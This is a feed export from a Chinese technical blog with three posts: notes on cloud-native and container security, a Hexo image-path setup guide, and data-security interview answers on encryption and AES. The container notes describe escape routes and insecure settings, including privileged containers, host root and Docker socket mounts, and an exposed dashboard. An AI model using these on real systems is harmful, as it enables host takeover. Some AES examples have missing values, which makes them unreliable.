volumes<br><br></code></pre></td></tr></table></figure><p>基于不同的系统又有不同的存储驱动和不同的目录结构</p><p>镜像每一层的ID是该文件内容的散列校验值，作为该层的唯一标识。</p><p>镜像索引方式：</p><p>读取镜像的manifests文件</p><p>获取config的sha256码</p><p>得到镜像config文件</p><p>遍历manifests文件中的所有层（layer）</p><p>根据sha256码在本地查找</p><p>拼出完整镜像</p><h4 id="存储驱动"><a href="#存储驱动" class="headerlink" title="存储驱动"></a>存储驱动</h4><p>Docker 依靠驱动技术管理镜像和运行它们的容器间的存储和交互</p><p>当前支持的存储驱动</p><p>overlay2、aufs、fuse-overlays、devicemapper、btrfs、zfs、vfs</p><h4 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h4><p>docker采用数据卷（Volume）的形式向容器提供持久化存储</p><h3 id="容器网络"><a href="#容器网络" class="headerlink" title="容器网络"></a>容器网络</h3><p>容器网络目前可分为主机网络和集群网络</p><p>主机网络</p><p>以Docker为例，分为 None 网络模式、Bridge 网络模式、Host 网络模式和 Container 网络模式</p><p>集群网络以 Kubernetes 为例</p><p>Pod 为 Kubernetes 应用运行的基本单元，每个 Pod 中包含一个或多个相关的容器，多个容器运行在同一主机中，并且共享相同的网络命名空间和相同的Linux协议栈</p><p>集群网络基于Pod主要涉及以下三种通信</p><p>同一Pod内，容器和容器之间的通信</p><p>同一主机内不同Pod之间的通信</p><p>跨主机Pod之间的通信</p><h3 id="容器运行时"><a href="#容器运行时" class="headerlink" title="容器运行时"></a>容器运行时</h3><p>容器运行时负责管理容器运行的整个生命周期，包括但不限于指定容器镜像格式、构建镜像、上传和拉取镜像、管理镜像、管理容器实例、运行容器等</p><p>OCI（Open Container Initiative）开放容器标准</p><p>包含容器运行时标准和容器镜像标准</p><p>容器运行时标准主要包含 runC、Rocket、Kata Containers、gVisor等</p><p>CRI（Container Runtime Interface）容器运行时接口</p><p>当前支持的CRI运行时包括 Docker、Containerd、CRI-O</p><h2 id="容器编排"><a href="#容器编排" class="headerlink" title="容器编排"></a>容器编排</h2><p>关注度较高的容器编排平台</p><p>Kubernetes </p><p>apache mesos</p><p>docker Swarm</p><p>OpenShift</p><p>Rancher</p><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>服务之间通常通过 RESTful 通信</p><h2 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h2><p>Service Mesh</p><p>通常通过一组轻量级网络代理实现，这些代理与应用程序一起部署，而无须感知应用程序本身</p><p>Sidecar 运行在服务旁，并对服务透明。由于所有通过服务的流量均会经过Sidecar，因此Sidecar可实现流量控制功能，如服务发现、负载均衡、智能路由、故障注入、熔断器、TLS终止等</p><p>Istio为代表</p><h2 id="Serverless"><a href="#Serverless" class="headerlink" title="Serverless"></a>Serverless</h2><p>Serverless可在不考虑服务器的情况下构建并运行应用程序和服务，也就是开放者只负责开发，服务器均交给第三方管理</p><p>两种实现方式</p><p>BaaS（Backend as a Service，后端即服务）</p><p>FaaS（Functions as a Service，函数即服务），主要实现方式</p><p>典型代表</p><p>AWS Lamba</p><p>阿里云的函数计算</p><p>Kubernetes的kubeless</p><p>Apache OpenWhisk</p><h1 id="云原生安全架构"><a href="#云原生安全架构" class="headerlink" title="云原生安全架构"></a>云原生安全架构</h1><h2 id="容器安全"><a href="#容器安全" class="headerlink" title="容器安全"></a>容器安全</h2><p>关键字：容器逃逸</p><h3 id="容器基础设施安全"><a href="#容器基础设施安全" class="headerlink" title="容器基础设施安全"></a>容器基础设施安全</h3><p>主机安全配置是否会影响到容器</p><p>主机恶意进程和安全漏洞是否会影响到容器</p><p>容器内进程是否可以利用主机上的安全漏洞</p><h3 id="容器镜像安全"><a href="#容器镜像安全" class="headerlink" title="容器镜像安全"></a>容器镜像安全</h3><p>镜像中的软件是否存在安全漏洞</p><p>镜像构建过程中是否存在安全风险</p><p>镜像传输过程中是否被恶意篡改</p><h3 id="容器运行安全"><a href="#容器运行安全" class="headerlink" title="容器运行安全"></a>容器运行安全</h3><p>运行的容器间的隔离是否充分</p><p>容器间的通信是否安全</p><p>容器内的恶意程序是否会影响到主机或者其他容器</p><p>容器的资源使用情况是否安全</p><h3 id="容器编排安全"><a href="#容器编排安全" class="headerlink" title="容器编排安全"></a>容器编排安全</h3><p>Docker自身的安全性</p><p>service mesh&#x2F;serverless对容器安全的影响</p><p>容器中安全密钥的管理和传统环境的不同</p><p>容器化的数据隐私保护与传统的数据隐私保护是否一致</p><h3 id="容器应用安全"><a href="#容器应用安全" class="headerlink" title="容器应用安全"></a>容器应用安全</h3><h2 id="安全能力架构"><a href="#安全能力架构" class="headerlink" title="安全能力架构"></a>安全能力架构</h2><h3 id="物理安全"><a href="#物理安全" class="headerlink" title="物理安全"></a>物理安全</h3><h3 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h3><p>系统完整性保护</p><p>OS&#x2F;DB&#x2F;WEB加固</p><p>安全补丁</p><p>病毒防护</p><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><p>防火墙</p><p>IDS&#x2F;IPS</p><p>Anti-DDOS</p><p>僵尸网络&#x2F;蠕虫检测</p><p>网络平面隔离</p><p>传输安全（SSL&#x2F;VPN)</p><h3 id="管理安全"><a href="#管理安全" class="headerlink" title="管理安全"></a>管理安全</h3><p>多因素接入认证</p><p>集中用户管理和认证</p><p>集中日志审计</p><p>镜像签名和完整性保护</p><h3 id="虚拟化安全"><a href="#虚拟化安全" class="headerlink" title="虚拟化安全"></a>虚拟化安全</h3><p>虚拟机隔离</p><p>虚拟防火墙</p><p>恶意VM预防</p><h3 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h3><p>数据隔离</p><p>数据访问控制</p><p>剩余信息保护</p><p>快照加密</p><p>用户数据加密存储</p><p>存储位置要求</p><h1 id="元原生安全风险"><a href="#元原生安全风险" class="headerlink" title="元原生安全风险"></a>元原生安全风险</h1><h2 id="容器基础设施的风险分析"><a href="#容器基础设施的风险分析" class="headerlink" title="容器基础设施的风险分析"></a>容器基础设施的风险分析</h2><h3 id="1、容器基础设施面临的风险"><a href="#1、容器基础设施面临的风险" class="headerlink" title="1、容器基础设施面临的风险"></a>1、容器基础设施面临的风险</h3><h4 id="1-1、容器镜像存在的风险"><a href="#1-1、容器镜像存在的风险" class="headerlink" title="1.1、容器镜像存在的风险"></a>1.1、容器镜像存在的风险</h4><h5 id="1-1-1、不安全的第三方组件"><a href="#1-1-1、不安全的第三方组件" class="headerlink" title="1.1.1、不安全的第三方组件"></a>1.1.1、不安全的第三方组件</h5><p>基于原生镜像的基础上进行二次开发，导致原有镜像中存在非必须的组件，且这些组件存在风险。</p><h5 id="1-1-2、恶意镜像"><a href="#1-1-2、恶意镜像" class="headerlink" title="1.1.2、恶意镜像"></a>1.1.2、恶意镜像</h5><p>公共镜像存在引入恶意镜像的风险</p><h5 id="1-1-3、敏感信息泄露"><a href="#1-1-3、敏感信息泄露" class="headerlink" title="1.1.3、敏感信息泄露"></a>1.1.3、敏感信息泄露</h5><p>为开发调试的便捷性，存在将敏感信息写入代码或配置文件，构成镜像时，敏感信息一并打包到，传输的外部镜像仓库，导致信息泄露。</p><h4 id="1-2、活动容器存在的风险"><a href="#1-2、活动容器存在的风险" class="headerlink" title="1.2、活动容器存在的风险"></a>1.2、活动容器存在的风险</h4><h5 id="1-2-1、不安全的容器应用"><a href="#1-2-1、不安全的容器应用" class="headerlink" title="1.2.1、不安全的容器应用"></a>1.2.1、不安全的容器应用</h5><p>如果启动时配置了端口映射，容器应用外部可访问，传统业务代码的安全风险依然存在。</p><h5 id="1-2-2、不受限制的资源共享"><a href="#1-2-2、不受限制的资源共享" class="headerlink" title="1.2.2、不受限制的资源共享"></a>1.2.2、不受限制的资源共享</h5><p>默认情况下，Docker不会对容器的资源使用进行限制，也就是容器可以无限制使用宿主机资源。存在容器耗尽宿主机资源的风险。</p><h5 id="1-2-3、不安全的配置与挂载"><a href="#1-2-3、不安全的配置与挂载" class="headerlink" title="1.2.3、不安全的配置与挂载"></a>1.2.3、不安全的配置与挂载</h5><p>配置与挂载：容器在启动时带有的配置选项和挂载选项</p><p><strong>容器核心隔离机制</strong>：</p><ul><li>Linux命名空间机制：在文件系统、网络、进程、进程间通信和主机名等方面实现隔离。</li><li>cgroups机制：在CPU、内存和硬盘等资源方面实现隔离。</li><li>Capabilities、Seccomp和AppArmor等机制：限制容器内进程间的权限和系统调用访问能力</li></ul><p><strong>打破隔离方式</strong>：</p><ul><li>配置 –privileged 选项，容器将不受 Seccomp等安全机制的限制，容器内root权限将变得和宿主机上的root一样</li><li>配置 –net&#x3D;host，容器将与宿主机处于同一网络命令空间（打破网络隔离）</li><li>配置 –pid&#x3D;host，容器将与宿主机处于同一进程命令空间（打破进程隔离）</li><li>执行挂载 –volume &#x2F;:&#x2F;host，宿主机根目录将被挂载到容器内部（打破文件系统隔离）</li></ul><p>1.3、容器网络存在的风险</p><h3 id="3-4、运行时容器的攻击案例"><a href="#3-4、运行时容器的攻击案例" class="headerlink" title="3.4、运行时容器的攻击案例"></a>3.4、运行时容器的攻击案例</h3><h4 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h4><p>1）主要影响机密性、完整性的：通常是获取目标系统控制权、窃取或修改数据等。</p><p>2）主要影响可用性的：通常是对目标系统信息资源的耗尽型攻击。</p><h4 id="3-4-1、容器逃逸"><a href="#3-4-1、容器逃逸" class="headerlink" title="3.4.1、容器逃逸"></a>3.4.1、容器逃逸</h4><h5 id="3-4-1-1、不安全配置导致的容器逃逸"><a href="#3-4-1-1、不安全配置导致的容器逃逸" class="headerlink" title="3.4.1.1、不安全配置导致的容器逃逸"></a>3.4.1.1、不安全配置导致的容器逃逸</h5><p>docker 已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。</p><p>Docker默认赋予容器近40项权限中的14项</p><p>CAP_CHOWN</p><p>CAP_DAC_OVERRIDE</p><p>CAP_FSETID</p><p>CAP_FOWNER<br>CAP_MKNOD<br>CAP_NET_RAW<br>CAP_SETGID<br>CAP_SETUID<br>CAP_SETFCAP</p><p>CAP_SETPCAP</p><p>CAP_NET_BIND_SERVICE</p><p>CAP_SYS_CHROOT<br>CAP_KILL<br>CAP_AUDIT_WAITE</p><p><strong>–privileged  特权模式运行容器</strong></p><p>特权容器允许访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有于那些直接运行在宿主机上的进程几乎相同的权限</p><p>创建非特权容器</p><p>docker run -itd –name non_privileged_centos centos &#x2F;bin&#x2F;bash</p><p>root@VM-8-5-ubuntu:~# docker run -itd –name non_privileged_centos centos &#x2F;bin&#x2F;bash<br>f2fa3a889b7d43d5bc371bf02d62b360ffa9cce7737eb6a4cfae60864be5625e</p><p>创建特权容器</p><p>docker run -t -i -d –privileged  –name privileged_centos centos &#x2F;bin&#x2F;bash</p><p>root@VM-8-5-ubuntu:~# docker run -t -i -d –privileged  –name privileged_centos centos &#x2F;bin&#x2F;bash<br>7ef25d5d2b4605bef917323d591f9596b95c6262268fda77edac4f13322de2f5</p><p>root@VM-8-5-ubuntu:~# docker run -itd –name privileged busybox –privileged<br>e5b459ca0fe56484dee600d919f1fafde42631923fa326393d60c1692fea1d27<br>docker: Error response from daemon: failed to create shim: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: “–privileged”: executable file not found in $PATH: unknown.</p><p>docker exec id fdisk -l</p><p>docker exec id fdisk -l | tail -n 2</p><p>ps </p><p>procfs</p><h5 id="3-4-1-2-不安全挂载导致的容器逃逸"><a href="#3-4-1-2-不安全挂载导致的容器逃逸" class="headerlink" title="3.4.1.2 不安全挂载导致的容器逃逸"></a>3.4.1.2 不安全挂载导致的容器逃逸</h5><p>将宿主机敏感文件或敏感目录挂在到不可控的容器中，会存在安全问题</p><h6 id="将-Docker-Socket-挂载到容器内"><a href="#将-Docker-Socket-挂载到容器内" class="headerlink" title="将 Docker Socket 挂载到容器内"></a>将 Docker Socket 挂载到容器内</h6><p>Docker Socket 是 Docker  守护进程监听的UNIX套接字，用来与守护进程通信-查询信息或下发命令，如果将该套接字文件&#x2F;var&#x2F;run&#x2F;docker.sock挂载到攻击者可控容器，存在被逃逸的风险</p><h6 id="挂载宿主机-profs"><a href="#挂载宿主机-profs" class="headerlink" title="挂载宿主机 profs"></a>挂载宿主机 profs</h6><h5 id="3-4-1-3-相关程序漏洞导致的容器逃逸"><a href="#3-4-1-3-相关程序漏洞导致的容器逃逸" class="headerlink" title="3.4.1.3 相关程序漏洞导致的容器逃逸"></a>3.4.1.3 相关程序漏洞导致的容器逃逸</h5><p>CVE-2019-5736 覆盖宿主机上的runC文件</p><h5 id="3-4-1-4-内核漏洞导致的容器逃逸"><a href="#3-4-1-4-内核漏洞导致的容器逃逸" class="headerlink" title="3.4.1.4 内核漏洞导致的容器逃逸"></a>3.4.1.4 内核漏洞导致的容器逃逸</h5><p>CVE-2016-5195 内存页的写时复制问题</p><h4 id="3-4-2-安全容器逃逸"><a href="#3-4-2-安全容器逃逸" class="headerlink" title="3.4.2 安全容器逃逸"></a>3.4.2 安全容器逃逸</h4><h4 id="3-4-3-资源耗尽型攻击"><a href="#3-4-3-资源耗尽型攻击" class="headerlink" title="3.4.3 资源耗尽型攻击"></a>3.4.3 资源耗尽型攻击</h4><p>容器运行时默认情况下未对容器内进程在资源使用上做任何限制，以Pod为基本单位的容器编排管理系统在默认情况下也未对用户创建的Pod做任何CPU、内容使用限制</p><h5 id="3-4-3-1-CPU资源耗尽攻击"><a href="#3-4-3-1-CPU资源耗尽攻击" class="headerlink" title="3.4.3.1 CPU资源耗尽攻击"></a>3.4.3.1 CPU资源耗尽攻击</h5><h2 id="容器编排平台的风险分析"><a href="#容器编排平台的风险分析" class="headerlink" title="容器编排平台的风险分析"></a>容器编排平台的风险分析</h2><h3 id="容器编排平台面临的风险"><a href="#容器编排平台面临的风险" class="headerlink" title="容器编排平台面临的风险"></a>容器编排平台面临的风险</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>CNI插件Flannel：Pod之间通信的工具</p><p>kube-system命名空间</p><p>Flannel Pod</p><p>kube-proxy Pod</p><p>Kubernetes集群中需要以YAML声明式文件的形式来创建Pod，Pod为逻辑概念，实际由一个或多个容器组成。</p><p>对容器的配置须以Pod的配置方式下发。</p><h4 id="4-1-1-容器基础设施存在的风险"><a href="#4-1-1-容器基础设施存在的风险" class="headerlink" title="4.1.1 容器基础设施存在的风险"></a>4.1.1 容器基础设施存在的风险</h4><p>kubernetes提供了ConfigMaps和Secrets两种资源来单独存储常规配置和敏感信息</p><h4 id="4-1-2-Kubernetes-组件接口存在的风险"><a href="#4-1-2-Kubernetes-组件接口存在的风险" class="headerlink" title="4.1.2 Kubernetes 组件接口存在的风险"></a>4.1.2 Kubernetes 组件接口存在的风险</h4><p>Kubernetes中绝大多数组件以基于HTTP或HTTPS的API形式提供服务</p><p>常见服务及端口信息</p><table><thead><tr><th>组件</th><th>默认端口</th><th>说明</th></tr></thead><tbody><tr><td>API Server</td><td>6443</td><td>基于HTTPS的安全端口</td></tr><tr><td>API Server</td><td>8080</td><td>不安全的HTTP端口，不建议启用</td></tr><tr><td>Kubelet</td><td>10248</td><td>用于检查kubelet健康状态的HTTP端口</td></tr><tr><td>Kubelet</td><td>10250</td><td>面向API Server提供服务的HTTPS端口</td></tr><tr><td>Dashboard</td><td>8001</td><td>提供HTTP服务的端口</td></tr><tr><td>etcd</td><td>2379</td><td>客户端与服务端之间通信的接口</td></tr><tr><td>etcd</td><td>2380</td><td>不同服务端实例之间通信的端口</td></tr></tbody></table><p>1、API Server</p><p>默认情况下，API Server在8080和6443两个端口提供服务</p><p>8080端口提供没有TLS加密的HTTP服务，所有到达端口的请求将绕过所有认证和授权模块（但是任然会被准入控制模块处理？？？）</p><p>6443端口提供TLS加密的HTTPS服务，到达的请求必须通过认证和授权机制才能被成功处理</p><p>2、Dashboard</p><p>按照官方文档部署的K8s需要经过 kubectl proxy 才可以通过本地8001端口访问dashboard，但是如果直接将dashboard映射到宿主机节点或者在执行 kubectl proxy是使用额外的参数（kubectl proxy –address 0.0.0.0 –accept-hosts&#x3D;’^*$’），会出现只要可以访问到宿主机的都可以访问到dashboard</p><p>默认情况下，dashboard是需要登录认证，但是如果在dashboard启动参数中添加 –enable-skip-login选项，则就可以通过点击dashboard界面的“跳过”来绕过认证</p><p>3、Kubelet</p><h2 id="云原生应用的风险分析"><a href="#云原生应用的风险分析" class="headerlink" title="云原生应用的风险分析"></a>云原生应用的风险分析</h2><p>5.3 云原生应用的新风险分析</p><p>5.3.1 数据泄露风险</p><p>1）应用漏洞</p><p>API造成的数据泄露风险</p><p>2）密钥不规范管理</p><p>硬编码</p><p>解决方案：</p><p>代码与配置可分离</p><p>配置支持分布式</p><p>配置实时可更新</p><p>配置可统一治理</p><p>3）应用间通信未加密</p><p>gRPC协议，默认不加密</p><p>5.3.2 未授权访问的风险</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>cloudsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>base</tag>
      
      <tag>cloudsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_images</title>
    <link href="/2024/12/16/yunwei/hexo/hexo_images/"/>
    <url>/2024/12/16/yunwei/hexo/hexo_images/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="hexo-typora"><a href="#hexo-typora" class="headerlink" title="hexo+typora"></a>hexo+typora</h2><h3 id="设置typora"><a href="#设置typora" class="headerlink" title="设置typora"></a>设置typora</h3><p>在设置-&gt;图像设置</p><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20221230182231829.png" alt="image-20221230182231829"></p><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>_config.yml中配置，会在使用 hexo new post_name 创建新文档时，在当前目录创建和文档名相同的文件夹，用于存储对应文档的图像</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">post_asset_folder:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>按照上述设置后，typora可以限制图像，但是hexo无法显示图像</p><h3 id="安装插件hexo-renderer-marked"><a href="#安装插件hexo-renderer-marked" class="headerlink" title="安装插件hexo-renderer-marked"></a>安装插件hexo-renderer-marked</h3><p>新版本hexo已集成hexo-renderer-marked，如果不确定，可以使用npm查询</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">➜  tthourshexo npm list hexo-<span class="hljs-keyword">renderer</span>-marked<br>hexo-site@0<span class="hljs-number">.0</span><span class="hljs-number">.0</span> /Users/admin/tthours/tthourshexo<br>└── hexo-<span class="hljs-keyword">renderer</span>-marked@6<span class="hljs-number">.3</span><span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure><h3 id="修改-config-yml配置"><a href="#修改-config-yml配置" class="headerlink" title="修改_config.yml配置"></a>修改_config.yml配置</h3><p>增加如下内容</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">marked:</span><br>  <span class="hljs-params">prependRoot:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">postAsset:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20241216185909849.png" alt="image-20241216185909849"></p><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20241216185919525.png" alt="image-20241216185919525"></p><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20241216185930812.png" alt="image-20241216185930812"></p><h3 id="安装插件hexo-asset-image-不好用"><a href="#安装插件hexo-asset-image-不好用" class="headerlink" title="安装插件hexo-asset-image(不好用)"></a>安装插件hexo-asset-image(不好用)</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm install hexo-asset-<span class="hljs-selector-tag">image</span> <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">➜  tthourshexo npm install hexo-asset-image --save<br><br>added <span class="hljs-number">21</span> packages, <span class="hljs-literal">and</span> audited <span class="hljs-number">254</span> packages in <span class="hljs-number">5</span>s<br><br><span class="hljs-number">30</span> packages are looking for funding<br>  run `npm fund` for details<br><br><span class="hljs-number">6</span> vulnerabilities (<span class="hljs-number">1</span> moderate, <span class="hljs-number">4</span> high, <span class="hljs-number">1</span> <span class="hljs-keyword">critical</span>)<br><br>Some issues need review, <span class="hljs-literal">and</span> may require choosing<br>a different dependency.<br><br>Run `npm audit` for details.<br></code></pre></td></tr></table></figure><p>插件的作用在于<code>hexo generate</code>生成静态网页资源时自动由相对路径生成绝对路径，但要求md文件中必须使用相对路径，此时的md中复制的图片目录为<code>/同名文件夹/图片名</code>，多了个文件夹路径</p><h4 id="图片文件根目录设置"><a href="#图片文件根目录设置" class="headerlink" title="图片文件根目录设置"></a>图片文件根目录设置</h4><p>打开<code>/blog/scaffolds/post.md</code>，该文件为每次hexo新建md文件时的格式，包括title、date等属性，在该属性中加入<code>typora-root-url: &#123;&#123; title &#125;&#125;</code>，使hexo新建的md文件自动以同路径下的同名文件夹为图片根目录。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】Typora与Hexo的图片根目录设置 Magnesium 2022年12月30日</p><p><a href="https://cmmyyyy.github.io/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/">https://cmmyyyy.github.io/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/</a></p><p>【2】Hexo插入图片（好用的办法）robotx 2023-11-29</p><p><a href="https://juejin.cn/post/7306723921717198899">https://juejin.cn/post/7306723921717198899</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datasec_数据安全面试</title>
    <link href="/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    <url>/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="专业知识与技能"><a href="#专业知识与技能" class="headerlink" title="专业知识与技能"></a>专业知识与技能</h2><h3 id="数据加密技术"><a href="#数据加密技术" class="headerlink" title="数据加密技术"></a>数据加密技术</h3><h4 id="对称加密与非对称加密"><a href="#对称加密与非对称加密" class="headerlink" title="对称加密与非对称加密"></a>对称加密与非对称加密</h4><p>Q:</p><p>询问候选人对对称加密（如 AES）和非对称加密（如 RSA）的理解。例如，“请解释一下对称加密和非对称加密的主要区别，以及它们各自的适用场景。”</p><p>A:</p><ul><li><p><strong>对称加密</strong></p><ul><li>定义与原理<ul><li>对称加密是一种加密方式，它使用相同的密钥进行加密和解密操作。也就是说，发送方和接收方必须事先共享一个密钥。例如，在使用 AES（高级加密标准）算法时，发送方使用密钥将明文加密成密文，接收方使用相同的密钥将密文还原为明文。这个密钥就像是一把特殊的 “锁” 和 “钥匙”，加密是 “锁” 上信息，解密是 “打开” 信息。</li></ul></li><li>主要特点<ul><li><strong>加密速度快</strong>：因为只需要使用一个密钥进行简单的数学运算，所以对称加密在处理大量数据时速度优势明显。例如，在对大型文件或者实时通信的数据流进行加密时，对称加密能够快速地完成加密操作，不会因为加密过程导致明显的延迟。</li><li><strong>密钥管理复杂</strong>：由于发送方和接收方需要共享相同的密钥，这就带来了密钥管理的难题。在多人通信或者分布式系统中，如何安全地分发密钥是一个关键问题。如果密钥在传输过程中被窃取，整个加密系统就会崩溃。</li></ul></li><li>适用场景<ul><li><strong>大量数据加密</strong>：对于需要加密大量数据的场景，如企业内部的数据存储加密、云存储中的用户数据加密等，对称加密是很好的选择。因为它的加密速度能够满足高效处理大量数据的需求。</li><li><strong>实时通信加密</strong>：在实时通信场景下，如语音通话、视频会议等加密，对称加密可以快速地对实时产生的数据流进行加密，保证通信内容的隐私性。</li></ul></li></ul></li><li><p><strong>非对称加密</strong></p><ul><li>定义与原理<ul><li>非对称加密使用一对密钥，即公钥和私钥。公钥可以公开，任何人都可以使用公钥对信息进行加密，但只有拥有私钥的人才能对加密后的信息进行解密。例如，在 RSA（一种非对称加密算法）中，发送方使用接收方的公钥对消息进行加密，接收方使用自己的私钥进行解密。</li></ul></li><li>主要特点<ul><li><strong>安全性高</strong>：由于公钥和私钥是成对出现的，且私钥由接收方妥善保管，即使公钥被泄露，攻击者也很难通过公钥推算出私钥，从而保证了信息的安全性。</li><li><strong>加密速度相对较慢</strong>：非对称加密的算法通常比对称加密复杂，涉及到更复杂的数学运算，如大整数的幂运算等。因此，在处理大量数据时，加密速度会明显慢于对称加密。</li></ul></li><li>适用场景<ul><li><strong>数字签名</strong>：非对称加密在数字签名方面有广泛应用。发送方可以使用自己的私钥对消息进行签名，接收方使用发送方的公钥来验证签名的真实性。这样可以确保消息的来源可靠，并且在传输过程中没有被篡改。</li><li><strong>密钥交换</strong>：在对称加密系统中，为了解决密钥分发的安全问题，可以先使用非对称加密来安全地交换对称加密所需的密钥。例如，在建立安全的网络连接（如 SSL&#x2F;TLS 协议）时，通过非对称加密交换对称加密的会话密钥。</li></ul></li></ul></li><li><h4 id="加密算法原理："><a href="#加密算法原理：" class="headerlink" title="加密算法原理："></a><strong>加密算法原理</strong>：</h4></li><li><p>考查对加密算法基本原理的掌握程度，如 “你能简单描述一下 AES 算法的加密过程吗？”</p><ol><li><p><strong>AES（高级加密标准）算法概述</strong></p><ul><li>AES 是一种对称加密算法，广泛应用于数据加密领域。它的加密过程主要包括多个轮次的变换操作，这些操作作用在数据块上，将明文转换为密文。AES 算法支持 128 位、192 位和 256 位的密钥长度，密钥长度不同，加密轮数也不同，分别是 10 轮、12 轮和 14 轮。下面以 128 位密钥长度（10 轮加密）为例来介绍其加密过程。</li></ul></li><li><p><strong>字节替换（SubBytes）</strong></p><ul><li><strong>作用</strong>：这是 AES 加密的第一步，它通过一个查找表（S - 盒）对输入数据块中的每个字节进行替换，这个操作主要是为了提供非线性变换，增加加密的复杂性。</li><li><strong>示例</strong>：假设输入数据块是一个 16 字节（128 位）的数组，每个字节的值在 0 - 255 之间。对于其中的任意一个字节，比如值为，通过查找 S - 盒，可以得到一个新的值来替换原来的。S - 盒是一个精心设计的置换表，它的设计使得字节替换操作具有混淆特性，让攻击者难以通过统计分析等方法来破解加密。</li></ul></li><li><p><strong>行移位（ShiftRows）</strong></p><ul><li><p><strong>作用</strong>：在字节替换之后，行移位操作主要是对数据块进行置换。它将数据块看作一个的字节矩阵，对矩阵的每一行进行循环左移操作，其中第一行不移动，第二行左移 1 个字节，第三行左移 2 个字节，第四行左移 3 个字节。</p></li><li><p><strong>示例</strong>：如果把字节替换后的 16 字节数据排列成如下矩阵形式：</p><p>经过行移位操作后，矩阵变为：</p><p>这种置换操作改变了字节之间的顺序，进一步增加了加密的安全性。</p></li></ul></li><li><p><strong>列混合（MixColumns）</strong></p><ul><li><strong>作用</strong>：列混合操作是对数据块中的列进行混合变换，它将每一列的 4 个字节看作一个多项式，然后与一个固定的多项式进行乘法运算，再对结果取模。这个操作使得每个字节的变化不仅依赖于自身，还依赖于同一列的其他字节，扩散了字节的影响范围。</li><li><strong>示例</strong>：对于数据块矩阵的某一列，通过列混合运算后变为，其中是通过对与固定多项式进行复杂的乘法和取模运算得到的。例如，（这里的乘法和加法是在有限域上进行的，其中系数 2 和 3 是在该有限域中的特殊定义）。</li></ul></li><li><p><strong>轮密钥加（AddRoundKey）</strong></p><ul><li><strong>作用</strong>：这一步是将经过前面一系列变换的数据块与轮密钥进行按位异或操作。轮密钥是由原始密钥通过密钥扩展算法生成的，每一轮加密都有一个对应的轮密钥。这个操作使得加密结果依赖于密钥，不同的密钥会产生完全不同的加密结果。</li><li><strong>示例</strong>：如果经过列混合后的 16 字节数据块是，当前轮的 16 字节轮密钥是，那么轮密钥加操作后的结果为（其中表示按位异或操作）。</li></ul></li><li><p><strong>多轮加密循环</strong></p><ul><li>上述的字节替换、行移位、列混合和轮密钥加四个步骤构成了 AES 算法的一轮加密。对于 128 位密钥长度的 AES 加密，需要进行 10 轮这样的操作。每一轮的操作都会使得数据块更加混乱和扩散，经过多轮加密后，最终得到的结果就是密文。</li></ul></li></ol></li><li><h4 id="密钥管理："><a href="#密钥管理：" class="headerlink" 